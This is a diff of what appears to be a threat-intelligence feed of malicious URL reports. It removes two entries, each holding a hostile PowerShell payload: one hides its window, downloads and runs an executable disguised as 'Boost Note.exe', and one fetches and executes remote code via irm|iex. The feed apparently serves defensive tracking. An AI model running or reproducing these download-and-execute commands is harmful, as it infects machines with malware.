@@ -5623,44 +5623,5 @@
     ],
     "ReportId": "cmwpthx4023zn0omleyj7lhjr",
     "ScannedAt": "2026-11-21T02:57:24.007000+00:00"
-  },
-  {
-    "UrlDomain": "rsventure.in",
-    "DeliveryUrl": [
-      "makeverizyjar.info",
-      "friendsoftorreabbey.com"
-    ],
-    "PayloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "IP": [
-      "91.108.98.174"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://friendsoftorreabbey[.]com/32b\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"TlkVMerN.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://friendsoftorreabbey.com/32b"
-    ],
-    "ReportId": "cmwpq1rz623xv0oml9b7ckyzg",
-    "ScannedAt": "2026-11-21T01:20:51.962000+00:00"
-  },
-  {
-    "UrlDomain": "www.wasinitaxi.com",
-    "DeliveryUrl": [
-      "j7tracker.gb.net"
-    ],
-    "PayloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/99ef1787ae952355"
-    ],
-    "IP": [
-      "157.90.71.19"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/99ef1787ae952355')|iex",
-    "ResolvedDownloadUrl": [
-      "https://j7tracker.gb.net/8pchkbdes5/99ef1787ae952355"
-    ],
-    "ReportId": "cmwpq1jvq23wg0omlvvcycyd4",
-    "ScannedAt": "2026-11-21T01:20:41.503000+00:00"
   }
 ]
